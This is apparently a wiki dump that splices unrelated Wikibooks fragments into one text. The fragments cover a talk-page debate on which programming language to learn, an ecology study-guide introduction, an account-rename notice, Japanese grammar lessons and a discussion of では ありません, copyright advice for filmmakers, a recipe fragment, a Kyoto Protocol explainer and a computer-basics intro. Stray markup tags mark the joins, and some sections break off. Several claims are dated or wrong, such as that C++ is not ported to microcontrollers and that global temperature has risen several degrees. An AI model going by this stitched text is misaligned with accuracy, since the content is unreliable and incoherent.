: So more I think about it so more I am in favour of 'ditch the whole &quot;What language should I learn thing&quot;'. Anybody unhappy if I actualy do it? --[[User:Krischik|Krischik]] 15:00, 16 Feb 2005 (UTC)

==== Algorithm Book ====

Actualy Chapter &quot;2.&quot; itself is cool - it's only the child chapters &quot;2.x.x&quot; which are problematic.

For clarity and ease of learning I would always go for an Algol type language. The explicit use of &quot;begin&quot; and &quot;end&quot; make learning easier. And if I had to name one I would name Pascal. Pascal has been designed for learning and it shows. (Note: I am an [[Programming:Ada|Ada]] advocate).

However: the [[Computer_Science:Algorithms]] have made a good job of using a pseudocode language (also Algol based). They allow only &quot;real&quot; languages in the [[Computer Science:Algorithms:Appendix A|Appendix]]. And now guess what - the pseudocode language was so sucessfull than no-one ever felt the need to contribute any &quot;real&quot; languages examples.

I think we should follow.

Off Topic: if you are a [[Programming:Python|Python]] advocate then please fill in the reason to learn [[Python]].

--[[User:Krischik|Krischik]] 11:48, 9 Feb 2005 (UTC)

: That's funny, you're a Ada advocate recommending Pascal, and I'm a Caml/Haskell advocate recommending Python :-D I think that pseudocode is great for an algorithms course, but then again, the algorithms course is either for people who know (a) how to program, or (b) don't really care about programming proper (hard core mathy cs people?), whereas an actual programming course would benefit from a real-world language with which the user can try stuff out.  That being said, I'm glad you're with me on pushing a language for its pedagogical merit and not its merit as a language in and of itself -- [[User:Kowey|Kowey]] 14:05, 9 Feb 2005 (UTC)

==== Templates ====

But there are all ready enough real-world language courses - like me pet [[Programming:Ada]]. ( well, just checked [[Programming:Pascal]] - not much there :-( ) - so we don't realy need one here.

But I just had an idea. Could we write the basics descriptions - like recursion - as templates and then use those templates povide the real articles in [[Programming:Ada]], [[Programming:C]] etc. pp.? 

For example &quot;Programming:Ada:Hello World&quot; would look like:

 &lt;nowiki&gt;
 {{Ada_Navigation_1|Hello World}}
 __TOC__
 {{Computer_programming:Hello World}}
 
 with Ada.Text_IO;
 
 procedure Hello is
 begin
   Ada.Text_IO.Put_Line(&quot;Hello, world!&quot;);
 end Hello;
 &lt;/nowiki&gt;

In &quot;Computer_programming:Hello World&quot; we describe what &quot;Hello Word&quot; does. 

For us as authors we only have to think up the lessons once and yet we get many nice &quot;Programming:XXX&quot; books all looking similar.

I have created a Demo on what this could like: [[Programming:Function_overloading]]

:Hmm... I was a bit worried about how you would handle the code interleaving, but you seem to implement it pretty well, with the semi-anonymous templates (0,1,etc).  So far so good, I think this is a good idea. -- [[User:Kowey|Kowey]] 17:11, 11 Feb 2005 (UTC)

== Closing chapter and counting votes ==

There had been no new arguments for a while and the votes are 2-1 for removing pointless advocacy in &quot;Choosing a programming language&quot;.

So today they go. There are down here if you think you need a last look at them:

== Choosing a programming language ==

=== What should I learn? ===

One immediate consideration when deciding which language to learn is how useful the language would be in the real world. Java and C or C++ would be a good choice if you want to write applications for a PC. Java is a very good language for large projects, as it sports sophisticated object-orientation and a large API. But C/C++ may be bad choices for beginners, as they are quite low level languages (of course, this choice depends on the programmer - if one is already familiar with the principles of computer architecture design, C may be a very good choice). [[Programming:Python|Python]] is a very good first language because it is powerful, has a clean syntax, is dynamically typed and [[Open_Source|Open Source]]. Languages like [http://www.geocities.com/page_tutorials PHP] and Javascript will introduce more concepts like variables and fuctions, and may be familiar to the web-developer. For server-side apps (web apps) however you can use [http://www.paulgraham.com/langdes.html any language you want].

There are however, other factors that you should consider.

==== How suitable is the language for beginners? ====

Many programming languages are geared specifically to be easy to learn, such as [[Programming:BASIC|BASIC]] or [[Programming:Pascal|Pascal]]. However, they are sometimes criticised for lacking in power as they have a limited range of language features. One should remember that the primary purpose of these teaching languages is to learn how to write structured programs. For more advanced applications, one may need a more specialised and complex language.

Some programming languages (such as [[Programming:Python|Python]] or [[Programming:Scheme|Scheme]]), while suitable for beginners in that the syntax is not difficult, still offer a full range of language features for even the most advanced programmers.

==== Is the language available or suitable on your computer system? ====

It probably will be. When you have chosen your language to start with, you should seek an implementation of it for your platform. A quick search on the internet, including both the language and your platform, should give you some commercial and free implementations.

Older legacy computer systems may have been written in an early computer language, such as [[Programming:COBOL|COBOL]]. In order to maintain or update these systems you may need to learn the language to read the original source code.

==== Will it help you learn other languages in the future? ====

The C-family (C, ObjectiveC, C++, C#, and Java) all resemble each other, so learning one would make learning others easier in some ways. Then again, superficial similarities can at times be confusing, and learning radically different kinds of language will help you adapt more easily to new languages in general.

&lt;!-- 
one... this is far from the only way to categorise languages: consider for example, the triangle of Imperative, Functional and Logic-Programming... two... this is not directly relevant 

Generally speaking languages fall into two categories: Static or Dynamic. A Static language is linked at compile time, after which it's fixed. A dynamic language is linked at run time based on the information available at that time. Dynamic languages tend to be more powerful than static languages.

Also, implementations fall into mainly two categories: interpreted or compiled. Where compilation is sometimes done just before execution, compiled languages are faster than interpreted. The difference between compilers for the different languages can be huge, however. Some languages, like Java, compile to bytecode, which is then interpreted or compiled.
--&gt;

==== Will it help you be a better programmer? ====

Learning academic languages like [[Programming:Prolog|Prolog]] might not seem worthwhile if you want to jump into the job market; however, the purity of these languages forces you to refine the way you think about programming and teaches you skills which can then be transferred to other languages. Some might even argue that programming in these languages is so much more efficient that you would not want to bother with the rest, but since programming can often involve working for/with other people you will likely have to learn a popular language anyway.

==== How practical is the language? ====

Now we return to our first concern in choosing a learning language: how useful will this language be in the real world?  Here you should consider how popular the language is, because working with people is inevitable and how appropriate the language is for the work you want to do is important. Unless you are pressed for time, it is recommended to take things slowly and focus on choosing a good learning language and worry about the practicality of that language later on.

&lt;!--
As an example of a language tied to a particular market, the [[Programming:MUMPS|MUMPS]] programming language is heavily used in the Healthcare and Banking industries. If you wanted to be involved in these industries, it would be a practical language to learn, even though it has its own quirks.

[[Programming:PHP|PHP]], [http://www.geocities.com/page_tutorials HTML], CSS, Javascript and other web technologies are useful if you want to go into the Web Designing market.
--&gt;

==== Learn them all! ====

There are several philosophies about how you should go about this. One is:
# If you just want to dabble, go straight for a higher level language or a dynamic language like Python. 
# If you want to be good, learn a higher level language, but also get a good grip on C and assembly language. 
# If you want to be great, postpone both until you get the hang of academic languages like [[Programming:ML|ML]] or [[Programming:Haskell|Haskell]].

But if your priorities are different, you may agree more with:
# If you want to portray yourself as an academic, try a language like [[Programming:ML|ML]].
# If you want to have a lot of trouble learning without accomplishing as much as you could, try languages like [[Programming:C|C]] and [[Programming:Assembly|assembly language]].
# If you want to get something done, use a high level scripting language like [[Programming:Python|Python]].

=== What languages should I use? ===

''If you only have a hammer, you tend to see every problem as a nail.'' -- Abraham Maslow

==== Effectiveness ====

One trade-off between programming languages is speed of execution versus ease of coding. Writing in [[Programming:Assembly|assembly language]] can result in the creation of the fastest and most compact program possible. The trade-off is that you may donate years of your life to creating the program, assuming it will be a moderately complex program and you will not be calling code from other higher level languages (which you must do if you write a program using libraries). Assembly language has an exact [[w:syntax|syntax]] that does very little with each command, since each command generally corresponds to only one or two processor [[Programming:Instructions|instructions]]. There are dialects called Macro Assembly languages that relax this restriction.

Modern compilers can generate optimized assembly code significantly faster and more efficiently than humans; however due to the variety of syntax compilers must interpret they are unable to generate the most optimized assembly code possible. Therefore, many desiring maximum optimization use either mid or higher level compiled languages and manually optimize the compiler's optimized assembly code.

Modern techonological advancements, particularly faster processors, have reduced the dependence on refining the optimizations of a particular code in favor of merely increasing the system requirements.

==== Cost ====

To begin programming the novice does not need to invest vast sums of money; acquiring the skill is dependent more on the time invested in learning to program rather than the amount of money spent. While many of the most powerful (highly optimized and developed) compilers and development suites are expensive, many other tools exist that are completely cost-free. Commercial products are mostly used by professional programmers who need highly optimised compiling and highly refined development suites to maximize their productivity. If you choose to pursue programming as a vocation, you may eventually want to invest in one of these development environments, but while you are learning to program, take advantage of the free tools available to you.

==== Go for the Ease (an opinion) ====

Unless you will be working with speed-critical applications (not likely the case if you are reading an introduction to programming), the preferred language is one that makes programming easier. For starters, it is probably more interesting as a programmer to write software that works 'correctly' instead of quickly. Programming in a higher level language lets you avoid a lot of syntax and hides many wonderful opportunities to introduce bugs into your code.

Even if you do turn out to be a flawless machine code hacker, you'll also find that software tends to be long-lived and needs to be maintained, either by you ten years down the road, some anonymous underling in the ladder of your megacorporation, or one of millions of eyeballs in the open source community. Somebody is going to have to read and fix that code, so you might as well choose a language which helps them do this.

Finally, the question of speed is actually trickier than we presented above. Working with higher level languages could simplify programming enough for you to concentrate on solving the problem in an efficient way instead of relying on minor tweaks and hacks which will simply be washed away when the (hypothetical) next generation computer rolls out two weeks later.

==== Abstractions Leak (a counter-opinion) ====

We have hopefully convinced you that programming in a higher level language is generally better for your health.  Yet if you take a look at the real world, you'll find many examples of people blissfully ignoring this sage advice. For example, both the [[w:Linux kernel|Linux kernel]] and most [[w:GNU|GNU]] software such as [[w:GNOME|GNOME]] are written in good old fashioned C.  

The popularity of C can be partly tied to historical reasons. Before the development of C in the early 70s, computer programs were largely written in assembly language.  At the time, there was a greater diversity of platforms, so programs in assembly language would have to ported from one platform to another in a time-consuming process. C was a major step forward, because relative to assembly language, it was a ''high level'' language, such that people could write their software once in C and have it automatically compiled to whatever platforms C was supported on.  C's popularity is largely self-propagating; people continue to use C because it is a popular language that is nearly universally supported.  

Relative to most modern languages, C is a very low-level language; it does not provide nearly as many abstractions over the &quot;bare metal&quot; as languages like Java.  This low-levelness can be seen to be particularly well-adapted for software like the Linux kernel whose job is precisely to manipulate the bare metal.  &lt;!-- somebody please please explain the abstractions leak argument... why abstractions are not always good --&gt;

=== Popularity ===

==== The popular programming languages ====

The most used programming languages are probably [[Programming:C|C]] and [[Programming:C plus plus|C++]].  They are both very similar because C is almost a subset of C++, and thus, you can use a C++ Compiler to compile most ANSI-conformal C code. So if you learn C++, you are automatically learning the syntax of C. C and C++ are highly portable. However, C++ hasn't been ported to small systems like microcontrollers and embedded engines. Some say that C code is faster than C++, but it depends on the programmer. There are C programs with ugly slow style and real fast C++ programs written in a clean reasoned object-oriented style. Some say the object-oriented stuff of C++ eases bug-cleaning leading to more secure programs. The two languages can be mixed on most compilers when the need arises.

Another commonly used language is [[Programming:Java|Java]]. One advantage is that Java &quot;executables&quot; (more precisely, they are called &quot;byte codes&quot;) can be run on many systems (almost always) completely unchanged. This is because byte codes are not executed directly by the processor, but by a piece of software known as a virtual machine, a computer within a computer so to speak. Initially, the added complexity of using a virtual machine slowed Java enough to provoke bitter complaints from users and developers, but several techniques have been used to improve its performance considerably. Java's structure and syntax is similar to C++ so if you know C++ you can easily learn Java; however, learning C++ after Java might require mastery of a few more concepts.

[[Programming:BASIC|BASIC]] (e.g. Visual Basic or QBasic) is also commonly used. It is very easy to program with and [[Programming:Visual Basic|Visual Basic]] is used for many things today in Windows programming just because it is easy.

Assembly is not as heavily used today as it once was, but learning it will greatly help you understand how a computer works, and how to better structure high level code. However, a knowledge of assembly language is vital if you wish to program low-level system routines for different hardware.

More code is written in [[Programming:COBOL|COBOL]] than any other language (there are estimates that COBOL accounts for 70% of existing code), but few new programs are being written in COBOL. There is, however, constant demand for programmers who can maintain old COBOL programs. 

Language is often a trivial factor in program speed, with the exception of CPU bound code written in languages that are usually interpreted (rather than compiled). If a bottleneck in your program is network speed, changing programming language won't help you out. If you must optimize, first make sure you actually '''know''' where the bottlenecks are, then look at things like algorithms. Other factors like checking if you're accessing the memory sequentially rather than randomly, may also be important at times. Re-writing in assembly is a last resort; at times it can yield excellent results, but a compiler beats a novice assembly programmer easily. Assembly sacrifices portability; while knowing it is a useful skill, using it in a large program should be a last resort. As assembly is so low-level, each processor architecture has to be specifically written for; a program written in assembly for a PC will need an extensive rewrite to be run on an ARM CPU. Higher-level languages are far more portable, as the compiler handles the translation of the language into the assembly code for the system's processor architecture.

Another distinction must be made between [[Programming:scripting|scripting]] languages and [[Programming:highlevel|very-high-level]] languages and other languages. Scripting languages, like [[Programming:Perl|Perl]] are interpreted languages that have been designed for performing short tasks with speed and ease of coding, often offering elastic syntax and allowing you to shrink complex tasks into just a dozen lines of code. They have been successfully implemented to solve day-to-day problems and not to build up complex, monolithic applications, although there are exceptions (Python-based applications, like MayaVi or Zope, are a notable example). Because of this, most dynamic languages these days will compile the code on the fly, whenever possible just in time, so that they run as fast as C in most cases. For example, there is no real speed difference between C and Lisp any more .</text>

      <format>text/x-wiki</format>
      <text xml:space="preserve">This is a study guide to basic ecology, a textbook at ''Wikibooks'' filed under [[Subject:Environmental sciences|environmental sciences]], and intended to establish a course of study in the subject of Basic Ecology, utilizing articles provided in ''[[w:|Wikipedia]]'', with links to other relevant web sites and other Wikibooks as appropriate. In some cases, portions of the text from  ''Wikipedia'' articles have been used to materially develop introductory text within the book.    

For the new user, it need be pointed out that ''Wikipedia'' differs from a standard encyclopedia in two important respects: 1) it is a ''hypertext'' document, and 2) it is open and editable, and therefore ''constantly changing''. For the student following this or any guide through ''Wikipedia'' to cover a specific subject, it is recommended that each article (page) be read first in its entirety, before any hyperlinks are followed to other topics or explanations.  It is too easy, otherwise, to simply become lost in a maze of links, and miss the main thrust of an article presented as an assignment from the Guide.  Because ''Wikipedia'' is constantly changing (and, it is believed, improving) the quality of each article encountered will be variable.  Some articles are well written and go to adequate depth, whereas others, lacking a proponent, may be are shallow and incomplete. Short or sloppy looking articles may contain questionable facts. These short-comings should diminish with time, but can be a problem for the student.  

One clear advantage to using this Guide linked to a hypertext like ''Wikipedia'' is a ''circular redundancy with serendipity'' factor that arises when an article is read and its hyperlinks followed; this factor can be a powerful learning tool. The persistent reader is  subjected to a fairly high degree of repetitive reading, often presenting slightly differing perspectives on the same general topic, with the result that learning comes from redundancy and seeing difficult concepts presented in more than one way. At the same time, some hyperlinks lead down less relevant paths, bringing new and unanticipated knowledge. If, as a student, you are truly interested in mastering the subject of basic ecology, you must be prepared to read beyond the basic assignments; in some cases, beyond Wikipedia to explore other, &quot;outside&quot; web sites.  

It seems likely that the typical user of ''Ecology'' is not necessarily an active student taking a course in biology or ecology at the high school (AP) or college level, but a person with a strong interest in environmental sciences&amp;mdash;an amateur naturalist or an environmentalist.  Therefore the guide will attempt to cover all of the basic principles of ecology in a logically organized manner with the ultimate intent of providing a solid foundation in the subject matter. It is assumed that the student has already a background in&amp;mdash;or certainly at least a good knowledge of&amp;mdash;biology.  Because &quot;ecology&quot; is a large and diverse subject, organization of the material becomes the key to a successful &quot;guide&quot; textbook.

      <text xml:space="preserve">Both this book and all articles in ''Wikipedia'' are [[w:free_content|free content]] that can be added to or edited by anyone.  It is an opportunity for the user of these documents to contribute information, or even state given information more clearly, simply by editing a page. As a student with a textbook and a lecturer (teacher), you may find yourself in possession of useful facts, another point of view on existing facts, or a report you prepared of exceptional quality.  Any of these can be added to an appropriate page in this Guide or the ''Wikipedia''.  However, this caution is strongly advised: ''Do not place into the book any text or pictures taken verbatim (or close to verbatim) from a text book, web site, or other copyrighted source without permission of the copyright holder''.  In general, this means, '''anything you submit should be your own work'''.

Consider that the purpose of a guide lies somewhere between that of an outline and that of a textbook. Your contribution to expanding or improving an article at ''Wikipedia'' that is linked from the book is as important as preparing or adding to a chapter or module here. However, developing the ''Guide'' is a balancing act. Eventually, it can become desirable to simply polish a module in the ''Guide'' rather than refer the reader on to an article that may have become too complex or for some other reason not perfectly suitable as an &quot;assignment&quot;. 

== Note to future contributors ==
Although conceived as a guide, by which is meant a sort of outline with links to Wikipedia articles, it is not necessary to maintain this format.  Indeed, for various reasons, ecology requires more in-depth discussion within each module than similar guides at Wikibooks (see ''[[Invertebrate Zoology]]'' and ''[[Botany]]''). If, as a contributor, you would prefer to flesh out any module with minimal reference to Wikipedia, that should be acceptable, so long as your contribution exceeds what is available on the topic at Wikipedia.  In this instance, &quot;exceeding&quot; is a reference to quality and not quantity.  In such cases, it might remain helpful to the student to place the reading &quot;assignment&quot; as a &quot;See also:&quot; link on the chapter page.  

Use of any Wikipedia article as a substitute for text should include consideration of the quality of information and writing at the assigned article. It is simply one approach to work on that article to ensure quality before assigning it.  Another approach would be to ignore the article at Wikipedia and develop the necessary text in the module itself.  This does have a disadvantage in that, through hyperlinks, the student may well later arrive at the &quot;rejected&quot; Wikipedia article anyway. If the information found there conflicts or confuses, the student may have difficulty establishing which bits of information are correct and which are not.

I'm not by any means fluent in Vietnamese, but I'd always thought that &quot;manh gioi khong?&quot; was a more standard greeting? [[User:Waitak|Waitak]] 11:38, 28 April 2006 (UTC)</text>

== Your account will be renamed ==

&lt;div class=&quot;plainlinks mw-content-ltr&quot; lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;
Hello,

The developer team at Wikimedia is making some changes to how accounts work, as part of our on-going efforts to provide new and better tools for our users like cross-wiki notifications. These changes will mean you have the same account name everywhere. This will let us give you new features that will help you edit and discuss better, and allow more flexible user permissions for tools. One of the side-effects of this is that user accounts will now have to be unique across all 900 Wikimedia wikis. See [[m:Special:MyLanguage/Single User Login finalisation announcement|the announcement]] for more information.

Unfortunately, your account clashes with another account also called Ztheday. To make sure that both of you can use all Wikimedia projects in future, we have reserved the name Ztheday~enwikibooks that only you will have. If you like it, you don't have to do anything. If you do not like it, you can [[Special:GlobalRenameRequest|pick out a different name]].

Your account will still work as before, and you will be credited for all your edits made so far, but you will have to use the new account name when you log in.

Sorry for the inconvenience.

Yours,&lt;br /&gt;[[m:User:Keegan (WMF)|Keegan Peterzell]]&lt;br /&gt;Community Liaison, Wikimedia Foundation

== Overview ==
In addition to the two syllabaries, ひらがな and カタカナ, Japanese also has a large number of [[Wiktionary:Ideographic|ideographic]] characters, almost all of which have come from the Chinese language.  These are called [[Wiktionary:漢字|漢字 (かんじ)]], and the number of them that exist in the Japanese language depends on whom you ask, and what context the language is used in.  There are 1,945 &quot;basic&quot; 漢字 defined for the Japanese public education system, and they are called Jōyō kanji (常用漢字).  These are the 漢字 that you are expected to know by the time you graduate high school in Japan.  Beyond this, there are a certain number that you would need to know in order to be able to read a newspaper, and a certain number that you would need to know in order to read texts in specialized fields.  The number that you would need to know in order to read historical texts is significantly higher.  By most counts, however, there are several thousand 漢字 in the Japanese language.

In the course of this textbook, you will see an increasing number of 漢字 used.  Each vocabulary section will define the 漢字 that you will be expected to be able to recognize, read and understand, as well as the number that you will be expected to be capable of writing and recalling from memory.  Beyond this, a high number of &quot;passive learning&quot; 漢字 will be used, always noted with [[Wiktionary:振り仮名|ふりがな]] (accompanying ひらがな to indicate pronunciation).  You will not be expected to know the 漢字, but it will make it easier for you to recognize them later when they are added to the vocabulary section.

== Compound words ==
Sometimes you will see a 漢字 by itself, but most frequently you will seem them grouped together to form compound words.  If you encounter a new word constructed from two 漢字, the process of looking up the definition of that word can be difficult.  The first step is to try to guess the meaning of the word based on context, and based on the symbols that make up each 漢字.  You can also try determine the pronunciation.  This is easier if you know the pronunciation of each character in other words that you've seen, but even if you don't recognize the character itself, you might recognize parts of the character that indicate its pronunciation.

== Vocabulary ==

# [[Wiktionary:名詞|名詞 (めいし)]] - ''noun''
# [[Wiktionary:動詞|動詞 (どうし)]] - ''verb''
# [[Wiktionary:形容詞|形容詞 (けいようし)]] - ''adjective''
# [[Wiktionary:助詞|助詞 (じょし)]] - ''particle; relational''

== Overview ==
The Japanese word for the English ''part of speech'' is [[Wiktionary:品詞|品詞 (ひんし)]].  It refers to all the different elements that can be used in a Japanese sentence, including the Japanese equivalents to English nouns, verbs, pronouns, adjectives, adverbs, as well as a few extra ones.

The Japanese equivalent of the English noun is [[Wiktionary:名詞|名詞 (めいし)]].  Like in English, 名詞 can refer to people, places, things, ideas, types of activity, etc.  In Japanese it is not necessary to explicitly include a noun in every sentence.  Though one is always implied, it can be omitted if it is clear what you are talking about.  Also, Japanese does not have a grammatical sense of pluralization or countability.  While you can, in certain situations, explicitly pluralize a noun, it doesn't effect the way the rest of the sentence is formed.  

The closest equivalent of the English verb is [[Wiktionary:動詞|動詞 (どうし)]].  動詞 refers to actions, and it can be conjugated to reflect tense, state, mood, etc.  As Japanese is an [[w:Subject Object Verb|SOV]] language, the main verb of every sentence goes at the end.  Unlike English, Japanese does not require the presence of a verb, and in many cases there simply isn't one.  Like English, 動詞 can be either [[Wiktionary:他動詞|他動詞]] (たどうし, ''transitive verb'') or [[Wiktionary:自動詞|自動詞]] (じどうし, ''intransitive verb'').

Japanese has two 品詞 for the English adjective: [[Wiktionary:い-形容詞|い-形容詞 (い-けいようし)]] and [[Wiktionary:な-形容詞|な-形容詞 (な-けいようし)]].  They are both used to describe 名詞, but they are treated entirely differently within Japanese grammar.  Because they are often used in a similar manner to nouns (名詞), the な-形容詞 are often called &quot;adjectival nouns&quot; in English.  い-形容詞, on the other hand, are often referred to as &quot;true adjectives.&quot;

One 品詞 that has no real equivalent in English is [[Wiktionary:助詞|助詞 (じょし)]], which is usually referred to as a &quot;particle&quot; or &quot;relational&quot; in English.  助詞 are used to indicate how the other 品詞 relate to each other.  That is to say, placing the 助詞 ''を'' after a 名詞 indicates that that 名詞 is functioning as a direct object of whatever 動詞 is being used in the sentence or phrase.  Among other things, this eliminates the need to have a constrained word order (as in English) or declension (as in German and in romance languages) to indicate the function of a particular part of speech.  It also makes word boundaries fairly clear, and so most written Japanese does not have spaces between words.

Let's examine these 品詞 in more detail.

== 名詞 ==
Like the English ''noun'', Japanese 名詞 refers to people, places, objects, or ideas that are acting, being acted upon, or being related to in some way.  As such, it includes [[Wiktionary:代名詞|代名詞 (だいめいし)]] (''pronoun''),</text>

How is __では　ありません pronounced, please? Is は a particle here and as such pronounced as 'dewa' or is it 'deha'? I think it would also be nice to clarify that in the lesson itself. Thanks a lot.
--[[User:Hhanke|Hhanke]] 00:13, 17 Feb 2005 (UTC)

: I'd like to know that too   :O&lt;BR&gt;&lt;BR&gt;After a little searching, it looks related to the particle (which makes sense, I suppose). It's pronounced &quot;__ dewa arimasen&quot;. - [[User:Sik0fewl|Sik0fewl]] 05:13, 9 Jun 2005 (UTC)

::: On a completely different topic (addressed to the contributers of this book):&lt;BR&gt;It would be great if in addition to the regular exercises, there would be practice JPLT questions at the end of each lesson.

:::: FYI, in this case it is pronounced &quot;wa&quot;. When ｢は」is used as a particle (i.e. a subject marker), it is pronouced &quot;wa&quot;. Otherwise, &quot;ha&quot;. There might be exception, but that's what I was taught. :) &lt;BR&gt;&lt;BR&gt; Also, IIRC, please note that 「では　ありません」is meant for use when referring to inanimate objects. When referring to people, the proper term is 「では　いません」. [[User:Lynx7725|Lynx7725]] 05:43, 9 Jun 2005 (UTC)

::::: Lynx is mistaken about 「では　いません」. 「～ではありません」is used regardless of whether one is talking about people or not.
::::: Also, in speech 「～ではありません」is usually contracted to 「～じゃありません」. - [[User:ToothingLummox|ToothingLummox]] 21:28, 25 August 2005 (UTC)

::::: Lynx is also incorrect in calling ｢は」a &quot;subject&quot; marker.  Although it is frequently translated as the English subject, it is instead a ''topic'' marker; it marks the preceding phrase as something the sentence is about. In future lessons we will undoubtedly see topics which are ''not'' subjects. --[[User:TEB728|teb728]] 07:12, 5 September 2005 (UTC)

ToothingLummox is correct. I'd just like to add &quot;...じゃあ ありません&quot; for the same meaning. Also, &quot;...では ない です&quot; and its variations &quot;...じゃ ない です&quot; and &quot;...じゃあ ない です&quot; are used in some situations.

:;では ありません and its variants
:*あれ は ほし では ありません。 - That is not a star. (are wa hoshi dewa arimasen)
:*わたし は なっとう が すき じゃ ありません。 - I do not like natto (watashi wa nattou ga suki ja arimasen)
:*かれ は きむら さん じゃ ない です。 - He is not Mr. Kimura. (kare wa kimura san ja nai desu)

Lynx7725 might be thinking about &quot;...はありません&quot; and &quot;...はいません&quot; matter. Both represent non-existance, but the former is used for inanimate objects while the latter is used for living things.

:;は ありません
:*ここ に は おかね は ありません。 - There's no money here. / I have no money here. (koko ni wa okane wa arimasen)
:*ベルリン の かべ は もう ありません。 - The Berlin Wall no longer exist. (berurin no kabe wa mou arimasen)
:;は いません
:*きょう かれ は いません。 - He is absent today. (kyou kare wa imasen)
:*あの ねこ は もう いません。 - The cat was gone... (ano neko wa mou imasen)

== Known page bugs ==

*Questions should probably be introduced before それは何ですか。
*''ko-so-a-do'' could be introduced here. My feeling is that it might be better to avoid these words altogether until a little later.
*''mo'' doesn't need to be introduced here. Should it be?
*''no'' doesn't need to be introduced here. Should it be?

== COPYRIGHT ==

Probably an area of major oversight, especially by short filmmakers.

'''The law regarding copyright is fairly simple:''' If you've created it then you own it. However, what you create must not contain creative content that has been produced by someone else who retains copyright. However, this must be in the context of originality.

== Basic Example ==

If you go outside and film a bird flying in the sky, that piece of footage belongs to you, and nobody else can use it without your permission. If you add a soundtrack created by someone else then you must assure you have permission from the soundtrack artist before using it, and, in most cases, you will have to pay them a small royalty fee.

{{NOTE|There is a large repository of public domain and free to use content (audio and visual) that can be utilized to avoid royalties, if your own creation is also free to use your will even expand the type of freely licensed source materials you can use.}}

You can film anywhere within the public domain without obtaining copyright permissions; however, if there is music being played and it is picked up in your recording then may be required obtain permission to use that music. Permission must be sought when filming on Private Land, National Trust areas, land owned by the Ministry of Defense and similar type areas.

{{NOTE|The issue with copyright assumption is that the last major reform removed the requirement to specifically inform others about the copyright status of their creations, and so today all creative work must be assumed to be under copyright even if as time goes by the copyright works are a minority in regards to the ones that already reverted into the public domain.}}

== A Common Mistake ==

Many people believe that if you are not making a profit from your video then you don't have to seek copyright permission. This is not true. You can be prosecuted regardless and whether or not you are making a profit. Profit only determines how much you are fined.

{{NOTE|It is however safe to assume that works that generate profit are more likely to get into legal problems or infringe in (or provide competition to) the economic interests of others.}}

There are various different types of copyright such as Performing Artists Copyright which is when you are recording a live band and Master Recording Copyright which is when you want to dub in a particular piece of material (such as a CD) which source must not be altered or re-performed.

*  1 Tablespoon table [[Cookbook:Salt|salt]]
*  1/8 cup of [[Cookbook:Sesame Oil|sesame oil]]
*  [[Cookbook:Olive Oil|olive oil]] as an additional supplement, if needed
*  16 oz. or 1 lb. of [[Cookbook:Pasta|angel hair pasta]] noodles

== Procedure ==

== です as Copula ==
There is a common misconception that です is equivalent to the English [[Wiktionary:Copula|copula]] ''is''.  The problem with that notion is that です is not a 動詞 (verb).  The comparison is useful, however, because it serves a similar function.  です is a 助詞 (particle) that indicates that the information in the preceding phrase ''is the case''.  Here is a very simple construction using です:

[[Wiktionary:花|花]]が[[Wiktionary:綺麗|きれい]]です。

が indicates that the preceding word, 花, is the subject.  です indicates that the preceding word, きれい, is being used to describe that subject.  The resulting meaning is: &quot;the flower is pretty.&quot;  '''''Note''': depending on context, this sentence could also mean &quot;the flowers are pretty,&quot; or &quot;a flower is pretty,&quot; or &quot;flowers are pretty.&quot;''</text>

Cheese knives come in a wide variety of shapes and sizes, including very small knives for cutting individual pieces, specialty knives with etching or openings in the blade to allow the knife to pass through the cheese more easily, and large two-handled knives.</text>

      <text xml:space="preserve">==Kyoto Protocol and the United States==
===What is the Kyoto Protocol?===
The most basic objective of the Kyoto Protocol is to reduce harmful greenhouse gas emissions prior to the levels of 1990. This protocol and its agreements are a legally binding contract for developed countries to reduce six of the leading greenhouse gases: carbon dioxide, methane, nitrous oxide, sulphur hexafluoride, Perfluorocarbons (PFCs), and Hydrofluorocarbons (HFCs)/Chlorofluorocarbons (CFCs).  These gases are naturally occurring, except for the last four: SF6, PFCs, HFCs, and CFCs.  These gases have a direct impact to Global Warming.

===What is the greenhouse effect?===
Greenhouse gases contribute to global warming, which is caused by the greenhouse effect. The greenhouse effect can be demonstrated in this way: suppose you are driving in a car on a hot summer day. The sun's rays shine down into your car through the windows. However, the heat cannot get out of the car because the windows reflect the heat trying to get out back towards the interior of the car. This causes the car to continue to heat up until the thing blocking the heat from getting out is removed or a cooling element of some type is activated in the car.

In the subject of global warming, the greenhouse gases are the &quot;windows&quot; and the Earth is the &quot;car.&quot; The sun's rays are somewhat deflected or absorbed through their travel through space and the atmosphere, but most of the energy still reaches the Earth's surface. This energy is reflected back toward space by the Earth, but because of the greenhouse gases it cannot go back into space. Therefore, the entire Earth warms up.

The global temperature has only risen a few degrees since the start of the Industrial Revolution. However, one must remember that we are talking about a ''global'' temperature increase, not just in one relatively small location. One would expect the temperature in one location to be varied, but the forces required to raise the average temperature on the entire planet would have to be immensely strong.

===Why are greenhouse gases detrimental to the environment?===
Granted, greenhouse gases (GHG) occur naturally in the environment, but since the Industrial Revolution, humans have intensified this process by emitting more GHG into the atmosphere than our environment can handle.  The main contenders are the automobile makers, industries such as coal (fossil fuel) burning power plants, and even landfills which release large amounts of hazardous methane (from decomposition). Some parties assert that this actually helps plant life to grow, on account of the fact that plants absorb carbon dioxide as a part of their photosynthesis. While this may be true, when the plant decays, the stored carbon is released back into the air. Scientists are afraid that if the dumping of greenhouse gases continues at the present rate, plant life may not be able to keep up.

===Where does the US stand on the Kyoto Protocol?===

History of Computers


What can a computer do for me?

A computer can improve efficiency, streamline productivity, and facilitate communication as well as entertain.  

In the work environment, a computer is used to perform a plethora of tasks. A primary function is word processing. A word processor is considered to be a virtual typewriter; it saves the document on a computer and allows instant editing. It also includes tools to review your grammar and to check your spelling, ensuring higher quality written work!

Another productivity use for computers is creating databases. These databases are easily created and can store information for quick access and retrieval. For example, if you have a large address book and want to get a person's address to send them a letter, you can use an address book application. This application uses a directory, or database, to store the contact information of the people you input into it. Then you can use a search feature that lets you look for a person's name (or part of their name) to quickly find their address, instead of flipping through endless pages of an actual address book.  

The computer's original function was calculation. A computer is incredibly fast at mathematical accounting - what would take a human hours to complete can be done in seconds. It is wonderful for keeping track of a budget, planning a savings account or performing thousands of other tasks.

Computers entertain by providing DVD-players and music players. Computers can also play video games. In addition, if you have a decent Internet connection, you can watch one of the many TV shows available online for your viewing pleasure.  

One of the most utilized features of computers is the gateway it provides to communication. Even a slow Internet connection will make communication easier. 

You can e-mail friends and family.

